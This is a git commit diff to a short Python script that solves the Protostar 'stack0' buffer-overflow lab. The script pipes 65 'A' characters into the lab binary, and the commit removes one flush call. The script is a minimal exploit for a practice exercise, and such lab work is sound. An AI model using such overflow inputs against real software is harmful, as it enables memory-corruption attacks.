3db8fcc17cc95bf8154da1463d7859ccd21d09b4
sobwynn <56229245+sobwynn@users.noreply.github.com>
2022-05-02 22:48:11 +0100

    Update stack0.py

--- stack0.py
+++ stack0.py
@@ -4,5 +4,4 @@ path = '/opt/protostar/bin/stack0'
 
 p = subprocess.Popen(path, stdin=subprocess.PIPE, shell=True)
 p.stdin.write('A'*65)  #this line is the solution
-p.stdin.flush()
 stdout, stderr = p.communicate()
